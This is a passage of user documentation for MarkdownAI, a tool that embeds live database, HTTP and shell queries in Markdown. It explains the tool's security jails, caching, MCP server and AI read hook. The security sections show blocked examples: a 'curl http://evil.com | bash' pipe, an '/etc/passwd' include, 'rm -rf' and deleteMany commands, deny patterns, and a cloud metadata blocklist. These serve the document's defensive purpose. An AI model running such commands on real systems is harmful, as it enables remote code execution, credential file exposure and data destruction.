4. Make sure the environment variable referenced in your connection (e.g. `MONGODB_URI`) is set in your environment before running `mai`.

When `mai` renders to static output, all `@connect` directives are stripped — they have no meaning outside a live document context.

#### Configuration

| Option | Description |
|--------|-------------|
| `uri=env.VAR_NAME` | Environment variable holding the database connection string. Never hardcode the URI directly. |

#### Examples

Define a MongoDB connection and use it in a query:

```
@connect reports type="mongodb" uri=env.MONGODB_URI
```

Define a local-scoped Postgres connection in an included file (won't bubble up to the parent document):

```
@connect staging type="postgres" uri=env.STAGING_PG_URI @local
```

Use a named connection in a query block, or rely on automatic resolution when only one connection is defined:

```
@db using="reports"
  db.orders.find({ status: "pending" })
@end
```

**Supported database types:** `mongodb`, `postgres`, `mysql`, `mssql`, `sqlite`, `redis`, `elasticsearch`

<!-- /mdd-section: 17-lang-connect -->

<!-- mdd-section: 18-lang-sources-db -->
### Language — @db Database Query Directive

The `@db` directive lets you embed live database queries directly inside a Markdown document. Instead of copying data out of a database and pasting it into your docs, your document fetches it fresh every time — so the data is always accurate.

#### What It Does

When you add an `@db` block to your document, MarkdownAI connects to a database you specify, runs your query, and injects the results directly into the rendered output. Results can be filtered, reshaped, formatted, and piped into other parts of the document. Because `@db` is a jailed directive, it is stripped out (disabled) by default and must be explicitly enabled in your security settings before it will run — keeping untrusted documents safe.

#### How To Use It

1. Enable `@db` in your security settings by adding it to `~/.markdownai/security.json`.
2. Set up a named connection using the `@connect` directive (see the @connect feature), or supply a connection URI directly with `uri=env.YOUR_VAR`.
3. Add an `@db` block to your document with a `query` and any optional options.
4. Use `columns` to pick and rename the fields you want in the output.
5. Use `where` to filter the results after the query runs.
6. Optionally add `@cache` to cache results so you can work offline without a live database connection.

#### Configuration

| Option | Description |
|---|---|
| `using="name"` | Name of a connection registered with `@connect` |
| `uri=env.VAR` | Inline connection URI from an environment variable (no `@connect` needed) |
| `query="..."` | The query to run — MongoDB or SQL depending on the connection type |
| `columns="field:Label,..."` | Select specific result fields and rename them for display |
| `where="expression"` | Post-query filter applied to the results (for best performance, filter in the query itself) |
| `as="type"` | Shorthand to render results in a specific format (e.g., table, chart) |
| `@cache session\|persist\|ttl=N\|mock=./file.json` | Cache results for the session, permanently, for N seconds, or use a local mock file |

#### Examples

Query a named database connection and display results as a table:
```
@db using="my-mongo" query="{ status: 'active' }" as="table"
```

Query using an inline connection URI from an environment variable, select two fields, and filter the results:
```
@db uri=env.DB_URI query="SELECT * FROM orders" columns="id:Order ID,total:Amount" where="total > 100"
```

Seed real data once and develop offline using a cached mock file:
```
@db using="prod-db" query="{ region: 'US' }" @cache mock=./data/us-results.json
```

<!-- /mdd-section: 18-lang-sources-db -->

<!-- mdd-section: 19-lang-sources-http -->
### Language — @http HTTP Request Directive

The `@http` directive lets you embed live data from any web API or HTTP endpoint directly in your markdown document. Instead of copying and pasting API responses that go stale, your document fetches the data fresh every time it runs — so your documentation always reflects reality.

#### What It Does

When you include an `@http` directive in your document, `mai` makes an HTTP request to the URL you specify and injects the response inline. You can pull a JSON field from a REST API, filter rows from a JSON array, or pipe raw text into a rendering step. By default, the directive is "jailed" — it produces no output unless the target domain has been explicitly added to your personal allowlist, keeping documents safe to share without worrying about unexpected outbound calls.

#### How To Use It

Add the `@http` directive anywhere in your document where you want live data to appear. The only required option is `url`. You can use a literal URL or reference an environment variable so credentials and endpoints never appear in the document source. For JSON responses, use `path` to extract a nested field, or `columns` and `where` to slice and filter an array. To enable a domain, add it to your allowlist in `~/.markdownai/security.json` — without that entry, the directive is silently removed from output.

#### Configuration

| Option | Description | Default |
|---|---|---|
| `url="..."` or `url=env.VAR` | The endpoint to call. Required. | — |
| `method="GET\|POST\|PUT\|DELETE"` | HTTP verb. POST, PUT, and DELETE require explicit permission in your security config. | `GET` |
| `path="dot.notation"` | Dot-path selector into a JSON response object. | — |
| `body='{"key":"value"}'` | Request body. Only valid when method is not GET. | — |
| `headers="Key=env.VAR,Key2=value"` | Comma-separated request headers. Literal credentials are masked automatically. | — |
| `timeout=5000` | Request timeout in milliseconds. | Security config default |
| `columns="field:Name"` | Select and rename fields from a JSON array response. | — |
| `where="expression"` | Filter rows from a JSON array response. | — |
| `as="type"` | Shorthand for piping output into a render step (e.g. `table`, `chart`). | — |
| `@cache session\|persist\|ttl=N\|mock=./file.json` | Control caching or substitute a local mock file during development. | — |

#### Examples

Fetch a single field from a JSON API:
```
@http url="https://api.example.com/status" path="version"
```

Pull data from an authenticated endpoint using an environment variable for the token:
```
@http url=env.API_URL headers="Authorization=env.API_TOKEN" path="data.summary"
```

Fetch a JSON array, filter it, and render it as a table:
```
@http url="https://api.example.com/deployments" columns="env:Environment,status:Status,ts:Deployed At" where="status == 'failed'" as="table"
```

<!-- /mdd-section: 19-lang-sources-http -->

<!-- mdd-section: 20-lang-sources-query -->
### Language — @query Shell Command Directive

The `@query` directive lets you embed the output of any shell command directly into your MarkdownAI document. This solves the problem of documentation going stale — instead of manually updating things like the last git commit, dependency audit results, or running container list, your document fetches that data live every time it renders.

#### What It Does

When your document is rendered, `@query` runs a shell command on your machine and inserts its standard output into the document at that point. The result is fully pipeable, meaning you can chain it into other MarkdownAI directives for further transformation. To keep your system safe, every command must appear on an allowlist you control — any command not on the list is silently stripped from output rather than executed.

#### How To Use It

Place `@query` inline in your document with the shell command you want to run in double quotes. If the command exits with an error, the directive produces an empty string and logs a warning — your document still renders. Pass `--strict` when rendering if you want errors to stop the build instead. Pass `--verbose` to see stderr output from commands.

To allow a command, add its pattern to `~/.markdownai/security.json` under the shell allowlist. Built-in block rules prevent inherently dangerous commands regardless of your allowlist.

You can control caching by appending `@cache` as the last modifier:
- `@cache session` — cache for the current render session
- `@cache persist` — cache across sessions
- `@cache ttl=N` — cache for N seconds
- `@cache mock=./file.json` — use a local file instead of running the command (useful for offline or CI use)

#### Examples

Embed the most recent git commit hash into your docs:
```
@query "git log --oneline -1"
```

Show when a file was first added to the repository:
```
@query "git log --follow --format=%aI --diff-filter=A -- ./README.md | tail -1"
```

Include a live npm dependency audit summary, cached for the session:
```
@query "npm audit --json" @cache session
```

List running Docker containers:
```
@query "docker ps --format json"
```

<!-- /mdd-section: 20-lang-sources-query -->

<!-- mdd-section: 21-lang-phases -->
### Language — @phase, @on complete, and @graph

The `@phase` directive lets you divide a `mai` document into named workflow stages, each with its own content and transition rules. Only the active phase loads into AI context at a time, keeping large documents fast and focused. `@graph` gives you a visual map of your workflow using a diagram block — for documentation purposes only.

#### What It Does

When you write a multi-step workflow in a `mai` document — an onboarding guide, a multi-stage pipeline, a troubleshooting runbook — phases let you break it into distinct named sections. Each phase can contain any `mai` directives, and you define what happens when a phase completes: move to another phase or call a macro. The MCP server automatically loads only the currently active phase into AI context, so your AI assistant sees exactly what is relevant right now rather than the entire document at once. The `@graph` block lets you draw a Mermaid diagram of your workflow for human readers; it has no effect on how phases actually run.

#### How To Use It

1. Declare a phase with `@phase <name>` and close it with `@end`.
2. Put any `mai` directives inside the phase body — fetches, macros, includes, plain markdown.
3. Add one or more `@on complete` lines inside the phase to define what happens next:
   - Transition to another phase: `@on complete -> next-phase-name`
   - Call a macro: `@on complete -> @call macro_name`
4. Multiple `@on complete` lines in the same phase execute sequentially, top to bottom.
5. Phases are optional — a document with no `@phase` blocks loads in its entirety.
6. Optionally, add a `mai-graph` fenced code block anywhere in the document to render a Mermaid diagram illustrating the flow. This is purely visual and does not control execution.

**Restrictions:**
- `@phase` blocks are only valid in the root document. Using `@phase` inside an `@import`-ed file causes a parse error. Using it inside an `@include`-d file is allowed but the phase tags are stripped and the body renders as normal content.
- `@on complete` is only valid inside a `@phase ... @end` block.

#### Examples

**Basic two-phase document:**
```
@phase intake
  @fetch https://api.example.com/tickets/open
  @on complete -> triage
@end

@phase triage
  @call summarize_tickets
  @on complete -> @call notify_team
@end
```

**Phase with multiple completion actions:**
```
@phase review
  @on complete -> archive
  @on complete -> @call send_summary
@end
```

**Workflow diagram (documentation only):**
````
```mai-graph
graph LR
  intake --> triage --> review --> archive
```
````

<!-- /mdd-section: 21-lang-phases -->

---

### Security

<!-- mdd-section: 22-security-config -->
### Security — Config File, Runtime Modes, Audit Log

MarkdownAI applies a "jail-first" security model: all dynamic document operations — database queries, HTTP requests, and SQL — are blocked by default unless you explicitly allow them. This protects you from accidentally running untrusted or malicious documents on your system. You control exactly what each document is permitted to do through a single configuration file on your machine.

#### What It Does

When you render or run a MarkdownAI document, the engine evaluates every dynamic directive (such as database queries or HTTP fetches) against your personal security rules before executing anything. Directives that are not explicitly permitted are silently stripped out rather than executed. The engine writes a permanent, tamper-proof audit log of all security-relevant events so you always have a record of what was allowed or blocked. Critical alerts — such as attempts to use always-blocked operations — are always printed to your terminal and cannot be suppressed by any document or configuration option.

#### How To Use It

1. Open (or create) the file `~/.markdownai/security.json` to configure your security rules.
2. Add the hostnames, query types, or patterns you want to permit to the allowlist. Anything not on the allowlist is stripped.
3. Add patterns you want to explicitly deny to the deny list — these are blocked with a warning even if they would otherwise pass.
4. Choose a runtime mode when running `mai` to control how much information you see during execution.
5. Review `~/.markdownai/audit.log` at any time to see a history of every security decision the engine made.

#### Commands

| Flag | Mode | Behavior |
|---|---|---|
| *(none)* | Silent | Blocked directives are stripped quietly; security events go to the log file only |
| `--verbose` | Verbose | Warnings and security events are also printed to your terminal as they happen |
| `--strict` | Strict | Any stripped directive is treated as an error and halts execution immediately |

#### Configuration

| File | Purpose |
|---|---|
| `~/.markdownai/security.json` | Your personal security rules — allowlists, deny patterns, and preferences |
| `~/.markdownai/audit.log` | Permanent log of every security event; cannot be disabled by documents or config |
| `~/.markdownai/runtime.log` | All warnings and above from every run, stored as structured JSON entries |

#### Examples

Run a document in the default silent mode (blocked directives stripped, no terminal noise):
```
mai render report.md
```

Run with verbose output to see security warnings as they happen:
```
mai render report.md --verbose
```

Run in strict mode so any blocked directive stops the render immediately:
```
mai render report.md --strict
```

<!-- /mdd-section: 22-security-config -->

<!-- mdd-section: 23-security-filesystem -->
### Security — Filesystem Confinement and Content Masking

MarkdownAI protects you from accidentally exposing sensitive files or credentials when your documents include or import other files. Two independent layers of protection work together: one controls which files your documents are allowed to read, and the other automatically masks any secrets found in the content that is returned.

#### What It Does

When your document uses `@include`, `@import`, or `@read` to pull in external content, every file access passes through two mandatory security layers that cannot be turned off. The first layer — confinement — restricts access to files within the same directory as your document, blocking any attempt to navigate outside that boundary or reference absolute paths. The second layer — content masking — scans the returned file content for credentials, tokens, connection strings, and other secrets before they ever reach your rendered output, replacing matched values with `***MASKED***`. This means that even if a file is allowed through, any sensitive values inside it are redacted automatically before you see them.

#### How To Use It

Both layers are always active with no setup required. When you run `mai`, the document's own directory becomes the access boundary by default. If you need to include files from a parent directory, use the `--allow-traversal` flag with a specific path on each invocation — this deliberately requires you to opt in every time rather than making it a persistent setting.

#### Configuration

| Option | What It Controls |
|---|---|
| `--allow-traversal <path>` | Permits access to one specific directory outside the document root. Must be provided on every invocation. |
| `allow_unmasked_paths` | Glob patterns for files that skip content masking entirely (set in security config). |
| `allow_unmasked_patterns` | Variable name patterns whose values are restored after masking (e.g. `NODE_ENV=*`, `PORT=*`). |
| `--cwd <path>` | Overrides the document root used as the confinement boundary. |

#### Examples

**Include a file from within the document's directory (always allowed):**
```
@include ./data/report.csv
```

**Include a file from a parent directory (requires explicit flag):**
```
mai render report.md --allow-traversal ../shared-data/
```

**A blocked attempt — absolute paths are always rejected:**
```
@include /etc/passwd
<!-- SECURITY_ALERT: absolute paths are blocked -->
```

<!-- /mdd-section: 23-security-filesystem -->

<!-- mdd-section: 24-security-shell -->
### Security — Shell Execution Jail (@query)

The shell execution jail controls exactly which shell commands your MarkdownAI documents are allowed to run via `@query`. It works on an allowlist-first basis — every command is blocked by default unless you explicitly permit it — so your documents can never run unexpected or dangerous commands.

#### What It Does

When a MarkdownAI document uses `@query` to run a shell command, the engine checks that command against your security configuration before executing it. Shell execution is disabled entirely by default, so documents cannot run any commands until you opt in. Once enabled, you define glob patterns for commands you want to allow (such as `git log *`), and optionally patterns for commands you always want to deny (such as `rm *`). Deny rules always win over allow rules. Built-in always-block and always-alert patterns are also enforced regardless of your configuration.

#### How To Use It

1. Enable shell execution in your security configuration file — it is off by default.
2. Add allowlist patterns for the specific commands your documents need to run.
3. Optionally add deny patterns for commands you want to block even if they match the allowlist.
4. Use `mai security shell test` to verify whether a specific command would be allowed or blocked before relying on it in a document.
5. Review the audit log periodically to see what commands have been executed.

#### Commands

| Command | Description |
|---|---|
| `mai security shell enable` | Turn on shell execution (disabled by default) |
| `mai security shell add "git log *"` | Add a glob pattern to the allowlist |
| `mai security shell remove "git log *"` | Remove a pattern from the allowlist |
| `mai security shell list` | Show all current allowlist and deny patterns |
| `mai security shell test "git log --oneline -1"` | Check whether a specific command is ALLOWED or BLOCKED, and why |

#### Configuration

| Option | Default | Description |
|---|---|---|
| `shell.enabled` | `false` | Master switch — all `@query` shell directives are stripped when false |
| `shell.allow_patterns` | `[]` | Glob patterns for commands that are permitted to run |
| `shell.deny_patterns` | `[]` | Glob patterns for commands that are always blocked (deny wins over allow) |
| `shell.allow_network` | `false` | Whether shell commands are permitted to make network calls |
| `shell.require_confirmation` | `false` | Prompt the user to confirm before each command runs |
| `shell.audit_log` | `true` | Record all command execution attempts to the audit log |

#### Examples

Enable shell access and allow Git log commands:
```
mai security shell enable
mai security shell add "git log *"
mai security shell add "npm audit *"
```

Test whether a command your document needs will actually be permitted:
```
mai security shell test "git log --oneline -5"
# → ALLOWED: matches allow_pattern "git log *"

mai security shell test "rm -rf /tmp/cache"
# → BLOCKED: matches deny_pattern "rm *"
```

<!-- /mdd-section: 24-security-shell -->

<!-- mdd-section: 25-security-database -->
### Security — Database Query Jail (@db)

The Database Query Jail controls exactly which database operations your live documents are allowed to run. It keeps your data safe by making database access read-only by default and blocking dangerous commands — so a document can never accidentally (or maliciously) delete, modify, or expose data it shouldn't touch.

#### What It Does

Every database connection used in a MarkdownAI document runs through a security jail before any query executes. The jail checks the operation against an allowlist of permitted commands, a blocklist of forbidden keywords, and an optional allowlist of specific collections or tables. Destructive operations — like dropping tables, deleting records, or granting database privileges — are always blocked, regardless of your configuration.

#### How To Use It

Use the `mai security db` commands to configure and test database security for each connection in your project.

1. Add a new database connection to the security config: `mai security db add <connection-name>`
2. Enable or enforce read-only mode for a connection: `mai security db set <connection-name>.readonly true`
3. Restrict queries to specific collections or tables: `mai security db allow-collection <connection-name> <collection>`
4. Block additional keywords beyond the built-in defaults: `mai security db deny-keyword <connection-name> <KEYWORD>`
5. Test whether a specific query would be allowed or blocked before using it in a document: `mai security db test <connection-name> "<query>"`

#### Commands

| Command | Description |
|---|---|
| `mai security db add <connection>` | Add a new connection to the security config |
| `mai security db set <connection>.<option> <value>` | Set a security option (e.g. `readonly true`, `max_results 500`) |
| `mai security db allow-collection <connection> <collection>` | Restrict queries to a specific collection or table |
| `mai security db deny-keyword <connection> <KEYWORD>` | Block an additional SQL/query keyword |
| `mai security db test <connection> "<query>"` | Test whether a query would be allowed or blocked |

#### Configuration

| Option | Description | Default |
|---|---|---|
| `allowed_operations` | List of query operations permitted (e.g. `find`, `aggregate`) | All read operations |
| `denied_keywords` | Additional keywords to block on top of built-in defaults | None |
| `allowed_collections` | If set, queries are restricted to only these collections/tables | All collections |
| `readonly` | When `true`, enforces strict read-only access for the connection | `true` |
| `max_results` | Maximum number of rows/documents a single query may return | `1000` |

#### Examples

Test whether a query is safe before embedding it in a document:
```
mai security db test primary "db.users.find()"
→ ALLOWED

mai security db test primary "db.users.deleteMany({})"
→ BLOCKED — operation matches always-blocked pattern: db.*.deleteMany()
```

<!-- /mdd-section: 25-security-database -->

<!-- mdd-section: 26-security-http -->
### Security — HTTP Request Jail (@http)

When your documents fetch live data using `@http`, MarkdownAI enforces strict controls over which requests are allowed. This "HTTP jail" prevents documents from reaching dangerous or unauthorized endpoints, ensuring that live documents cannot be weaponized to exfiltrate data or probe internal networks.

#### What It Does

Every outbound HTTP request made by an `@http` block passes through a security check before it is sent. You control which domains are permitted, which HTTP methods are allowed, and how large responses can be. Certain dangerous endpoints — such as cloud provider metadata services — are permanently blocked and cannot be overridden, no matter how the document or configuration is written. By default, HTTP requests are disabled entirely and must be explicitly enabled, so nothing reaches the network without your consent.

#### How To Use It

Use the `mai security http` commands to manage your HTTP allowlist interactively. Start by enabling HTTP access, then add only the domains your documents need. You can test any URL before using it in a document to confirm whether it will be allowed or blocked.

1. Enable HTTP access: `mai security http enable`
2. Add a domain to the allowlist: `mai security http add-domain <domain>`
3. Remove a domain: `mai security http remove-domain <domain>`
4. Test a URL before using it: `mai security http test "<url>"`

#### Commands

| Command | Description |
|---|---|
| `mai security http enable` | Enable outbound HTTP requests for `@http` blocks |
| `mai security http add-domain <domain>` | Add a domain to the allowlist (e.g. `api.github.com`) |
| `mai security http remove-domain <domain>` | Remove a domain from the allowlist |
| `mai security http test "<url>"` | Check whether a URL would be allowed or blocked, and why |

#### Configuration

| Option | Default | Description |
|---|---|---|
| `http.enabled` | `false` | Master switch — HTTP requests are blocked unless this is `true` |
| `http.allowed_domains` | `[]` | List of domains `@http` may contact |
| `http.denied_domains` | `[]` | Domains explicitly blocked even if they match other rules |
| `http.allowed_methods` | `["GET"]` | HTTP methods permitted (GET-only by default) |
| `http.max_response_size` | `1048576` (1 MB) | Maximum response body size in bytes |
| `http.timeout` | `10000` (10 s) | Request timeout in milliseconds |

Cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`, and related addresses) are permanently blocked and cannot be added to the allowlist.

#### Examples

Allow GitHub's API and fetch repository data in a document:

```
mai security http enable
mai security http add-domain api.github.com
```

Verify a URL is safe before writing it into a document:

```
mai security http test "https://api.github.com/repos/markdownai/core"
# → ALLOWED
```

<!-- /mdd-section: 26-security-http -->

<!-- mdd-section: 27-security-immutable-rules -->
### Security — Built-in Immutable Rules

MarkdownAI ships with a hardcoded set of security rules that can never be turned off, overridden, or bypassed by any configuration. These rules form an absolute safety floor, blocking the most dangerous operations — like wiping your filesystem or piping remote code into a shell — no matter what your document or settings say.

#### What It Does

Every time MarkdownAI executes a directive in your document, it checks the command against two built-in tiers of rules before anything else runs. The first tier — **always block** — stops the command dead and prints a security alert to your terminal. No allowlist, no config option, no override can permit these commands. The second tier — **always alert** — blocks the command by default, but a user can explicitly allowlist it; even then, a security notice is always printed so you know something elevated is happening.

#### How To Use It

There is nothing to configure — these rules are always active. When a document directive matches a blocked pattern, MarkdownAI immediately stops execution and prints an alert:

```
⚠  SECURITY ALERT -- Built-in Immutable Rule Matched
  File:    ./docs/status.md
  Line:    12
  Directive: @query "curl http://evil.com | bash"
  Rule:    always_block: "curl * | bash"
  Action:  BLOCKED
```

The alert tells you exactly which file and line triggered the rule, what directive was attempted, and which rule matched.

If you believe a blocked command is a false positive, report it at: https://github.com/markdownai/core/security

<!-- /mdd-section: 27-security-immutable-rules -->

---

### Auxiliary Tooling

<!-- mdd-section: 28-caching -->
### Caching — @cache Modifier System

The `@cache` modifier lets you attach caching to any data-fetching directive in your document — queries, API calls, or database lookups — so they run only once and reuse the result. This keeps your documents fast and ensures that AI-assisted workflows see the same snapshot of data from start to finish, even if the underlying source changes mid-session.

#### What It Does

When you add `@cache` to a directive, MarkdownAI stores the result after the first run and serves it from that stored copy on every subsequent read. You can choose whether the cache lives only for the current session (cleared when the server stops) or persists to disk across restarts. A time-to-live (TTL) option lets you control how long a cached value stays fresh. A special mock mode lets you point a directive at a local fixture file instead of a live source — ideal for offline development or testing. Sensitive data is always masked before anything is written to the cache.

#### How To Use It

Add `@cache` as the last modifier on any directive line. Choose the mode that fits your situation:

- `@cache` or `@cache session` — stores the result in memory for the current session only
- `@cache ttl=300` — session cache that expires after 300 seconds (5 minutes)
- `@cache persist` — writes the result to disk so it survives server restarts
- `@cache persist ttl=86400` — disk cache that expires after 24 hours
- `@cache mock=./fixtures/data.json` — always returns data from a local file; the live directive never executes

#### Commands

| Command | Description |
|---|---|
| `mai cache show` | List all cached entries |
| `mai cache show input.md` | List cached entries for a specific document |
| `mai cache clear` | Clear all cached entries |
| `mai cache clear --session` | Clear only in-memory session entries |
| `mai cache clear --persist` | Clear only disk-persisted entries |
| `mai cache seed input.md` | Populate the persist cache by running all directives in a document |
| `mai cache seed input.md --env .env.production --directive db` | Seed using a specific env file, for a specific directive type only |

#### Examples

**Cache a database query for the current session:**
```
@db "SELECT count(*) FROM orders WHERE status = 'open'" @cache session
```

**Cache an HTTP call to disk, refreshing every hour:**
```
@http "https://api.example.com/metrics" @cache persist ttl=3600
```

**Use a local fixture instead of hitting a live API:**
```
@http "https://api.example.com/products" @cache mock=./fixtures/products.json
```

**Offline development workflow:**
```bash
mai cache seed input.md --env .env.production   # pull real data into cache once
mai watch input.md                               # develop offline — no DB or network needed
mai cache clear input.md                         # refresh cache when you need fresh data
```

<!-- /mdd-section: 28-caching -->

<!-- mdd-section: 29-stripper -->
### Stripper — mai strip Command

The `mai strip` command removes all MarkdownAI syntax from a document, producing clean, standard markdown that is safe to commit, share, or open in any regular markdown viewer. It solves the problem of keeping live documents in sync with static outputs — you get the best of both worlds without locking readers into the MarkdownAI toolchain.

#### What It Does

When you run `mai strip`, it reads your MarkdownAI document and strips out every directive — environment variables, database connections, data queries, pipelines, and more — leaving behind only the human-readable text and structure. Conditional sections (like content that varies by environment) are resolved against whatever environment you provide, so the right branch of content is kept and the rest is discarded. Plain markdown content, graph documentation, and passthrough blocks are preserved exactly as written. The command never executes anything — it only removes or resolves syntax.

#### How To Use It

1. Run `mai strip` with your input document as the argument.
2. Optionally pass an environment file with `--env` so that conditional sections resolve correctly against your real variables.
3. Optionally specify an output file or directory with `-o`. If omitted, the stripped output is printed to the terminal.

You can strip a single file or an entire folder at once.

#### Commands

| Command | Description |
|---|---|
| `mai strip <input.md>` | Strip a single file and print the result |
| `mai strip <input.md> -o <output.md>` | Strip a single file and save to a new file |
| `mai strip <input.md> --env <.env.file> -o <output.md>` | Strip with environment variables for correct conditional resolution |
| `mai strip <./docs/> --env <.env.file> -o <./dist/>` | Strip an entire directory of documents |

#### Examples

Strip a document and preview the output:
```bash
mai strip README.md
```

Strip for production export with environment-aware conditionals:
```bash
mai strip docs/guide.md --env .env.production -o dist/guide.md
```

Strip an entire docs folder into a static output directory:
```bash
mai strip ./docs/ --env .env.production -o ./dist/
```

<!-- /mdd-section: 29-stripper -->

<!-- mdd-section: 30-mcp-server -->
### MCP Server — AI Integration

MarkdownAI's MCP Server acts as a bridge between AI assistants (like Claude) and your live documents. It intercepts AI file reads and routes them through the MarkdownAI engine, so AI tools always see resolved, up-to-date document content instead of raw source. The problem it solves: without it, an AI reads a document as plain text and misses all the live data, phases, and macros.

#### What It Does

When an AI assistant opens one of your MarkdownAI documents, the MCP Server steps in and serves it intelligently. For multi-phase documents, it loads only the active phase into the AI's context window at any given time — so a 20-phase document never floods the AI with everything at once. The AI works through each phase in sequence, calling for the next phase only when ready. The server also handles macro resolution, environment variable access, directive execution, and cache invalidation — all exposed as tools the AI can call during a session. Database connections are established once when the server starts and reused across the entire session.

#### How To Use It

Start the MCP server from your project directory using the `mai serve` command. Once running, any AI assistant configured to use it will automatically benefit from lazy phase loading and live document resolution — no extra steps required on your end.

#### Commands

| Command | Description |
|---|---|
| `mai serve` | Start the MCP server in the current directory |
| `mai serve --cwd /path/to/project` | Start the server rooted at a specific project directory |
| `mai serve --port 3000` | Start the server on a specific port |

#### Examples

Start the server in your current project:
```bash
mai serve
```

Start the server pointing at a different project directory:
```bash
mai serve --cwd ~/projects/my-docs
```

<!-- /mdd-section: 30-mcp-server -->

<!-- mdd-section: 31-hook -->
### Hook — PreToolUse AI Routing

When an AI assistant reads a MarkdownAI document, the hook silently intercepts that read and routes the file through the MarkdownAI engine before the AI ever sees it. The AI receives fully resolved, live content — not raw source — without any change to how it works or what it asks for.

#### What It Does

MarkdownAI documents start with a special `@markdownai` marker. The hook watches every file read the AI performs: if the file is a plain `.md` file with no marker, it passes through untouched. If it finds the marker, it hands the file off to the MarkdownAI server, which executes any embedded data fetches, queries, or pipelines, then returns the resolved output. The AI receives that resolved content as if it had just read a normal file. The entire process is transparent — the AI never knows the hook is there.

#### How To Use It

Install the hook once using `mai init`. MarkdownAI will auto-detect your AI client and install the hook into its configuration. After that, no further action is needed — every `.md` file the AI opens is automatically checked and routed if it is a MarkdownAI document.

#### Commands

| Command | Description |
|---|---|
| `mai init` | Auto-detect your AI client and install the hook |
| `mai init --client claude-code` | Install the hook explicitly for Claude Code |
| `mai init --client cursor` | Install the hook explicitly for Cursor |

#### Examples

Install the hook with auto-detection:
```bash
mai init
```

After installation, open any MarkdownAI document in your AI session — resolved live data will appear automatically.

<!-- /mdd-section: 31-hook -->

<!-- mdd-section: 32-cli-complete -->
### CLI Complete — All Remaining mai Commands

The `mai` CLI gives you a complete toolkit for building, watching, serving, securing, and inspecting your live markdown documents. These commands handle everything from automatically re-rendering documents when you save changes to locking down which databases and shell commands your documents are allowed to access.

#### What It Does

The `mai` command-line tool covers the full lifecycle of a live document. You can build a document once and write it to disk, or keep a watch process running that automatically re-renders whenever you edit a source file. A built-in cache lets you inspect, seed, and clear stored data fetched by your documents. A security system lets you control exactly which shell commands, databases, and web domains your documents can reach. Diagnostic commands let you see at a glance what phases, macros, and imported files make up any given document.

#### How To Use It

Run any `mai` command followed by the document file you want to work with. Most commands accept universal flags — `--env` to load a specific environment file, `--verbose` for detailed output, `--strict` to treat warnings as errors, and `--silent` to suppress all output except security alerts and fatal errors.

#### Commands

| Command | Description | Flags |
|---------|-------------|-------|
| `mai build <file>` | Render a document and write it to disk | `-o, --output <path>` (required), `--watch` |
| `mai watch <file>` | Watch a document for changes and re-render automatically | `--output <path>` |
| `mai serve` | Start the MCP server | `--cwd <path>`, `--port <N>` |
| `mai strip <file>` | Strip live directives from a document, producing plain markdown | — |
| `mai cache show [file]` | Show cached data for a document or all documents | `--expired`, `--persist`, `--session` |
| `mai cache clear [file]` | Clear cached data | `--session`, `--persist`, `--directive <type>` |
| `mai cache seed <file>` | Pre-populate the cache by running a document's fetches | `--env <file>`, `--directive <type>` |
| `mai security init` | Create or import a security policy | `--from .markdownai.json` |
| `mai security show` | Display the active security policy | — |
| `mai security shell <subcommand>` | Manage allowed shell commands (`enable`, `disable`, `add`, `remove`, `list`, `test`) | — |
| `mai security db <subcommand>` | Manage database access rules (`add`, `set`, `allow-collection`, `deny-keyword`, `test`, `disable`) | — |
| `mai security http <subcommand>` | Manage allowed HTTP domains (`enable`, `disable`, `add-domain`, `remove-domain`, `test`) | — |
| `mai security filesystem <subcommand>` | Manage file access rules (`show`, `add-block-path`, `test`, `test-mask`) | — |
| `mai security audit <subcommand>` | View and manage the security audit log (`show`, `show --blocked`, `clear`) | — |
| `mai list-phases <file>` | List all phases in a document with their transitions | — |
| `mai list-macros <file>` | List all macros used in a document with their source file | — |
| `mai list-imports <file>` | Show the full dependency tree for a document | — |

#### Examples

Build a document and write the output to a file:
```bash
mai build report.md --output dist/report.md
```

Watch a document and continuously re-render it as you edit:
```bash
mai watch report.md --output dist/report.md
```

See what data is currently cached for a document:
```bash
mai cache show report.md
```

Inspect which external files a document depends on:
```bash
mai list-imports report.md
```

<!-- /mdd-section: 32-cli-complete -->

---

### Testing

<!-- mdd-section: 33-e2e-test-suite -->
### E2E Test Suite — Fixture Files and CLI Verification

The E2E Test Suite gives MarkdownAI a full-system confidence check by running realistic documents through the entire rendering pipeline and verifying the output is correct. It solves the problem of catching integration bugs — issues that only appear when all language features, the CLI, and the file resolver work together in a real document context.

#### What It Does

The suite includes a set of realistic MarkdownAI documents that use every major language feature: includes, imports, macros, conditionals, data reads, environment variables, phases, pipelines, and caching. These documents are processed end-to-end — from source through parsing, rendering, and output — and the results are automatically verified. The suite checks that every directive is resolved (nothing raw leaks through), that output is non-empty, that stripping removes all directives, that validation passes, and that the `mai` binary itself starts and completes successfully.

#### How To Use It

Run the E2E tests from the project root using the standard test command:

```bash
pnpm test --project e2e
```

This executes all fixture documents through the engine and reports any failures. No configuration is needed — the fixture files and data are bundled with the suite. To run a targeted subset of scenarios, use Vitest's filter flag:

```bash
pnpm test --project e2e -t "cache"
```

#### Examples

Run the full E2E suite:
```bash
pnpm test --project e2e
```

Run only the CLI binary smoke tests:
```bash
pnpm test --project e2e -t "cli binary"
```

Run only the error-case tests to verify security and error handling:
```bash
pnpm test --project e2e -t "error"
```

<!-- /mdd-section: 33-e2e-test-suite -->

---

### AI-Native Features

<!-- mdd-section: 34-ai-consumer-mode -->
### AI — Consumer-Targeted Conditional Rendering (planned — not yet implemented)

Write one document and let it speak differently to different audiences. With consumer-targeted rendering, the same MarkdownAI file can show concise, structured content when read by an AI agent and richer, human-friendly prose when opened in a browser — no duplicate documents, no manual editing.

#### What It Does

When you render a MarkdownAI document you tell `mai` who the audience is. Sections you have tagged with `@if consumer="ai"` appear only for AI consumers; sections tagged `@if consumer="human"` appear only for human readers. Everything else renders for both. This lets you maintain a single source of truth while producing perfectly tailored output for each audience at render time.

#### How To Use It

Tag sections in your document using the `@if` / `@endif` block syntax, then pass `--consumer` when you render:

1. Open your `.md` document and wrap audience-specific content in conditional blocks.
2. Run `mai render` with the `--consumer` flag to produce output for the intended audience.

#### Commands

| Command | Description |
|---|---|
| `mai render <file> --consumer=ai` | Render the document for an AI consumer |
| `mai render <file> --consumer=human` | Render the document for a human reader |
| `mai render <file>` | Render without a consumer — all `@if consumer=` blocks evaluate to false |

#### Examples

**Basic AI vs. human split:**
```
@if consumer="ai"
**Status:** operational | uptime: 99.97% | last_incident: none
@endif

@if consumer="human"
## Service Status

Everything is running smoothly. No incidents in the past 30 days.
@endif
```

**Rendering for an AI agent:**
```bash
mai render status.md --consumer=ai
```

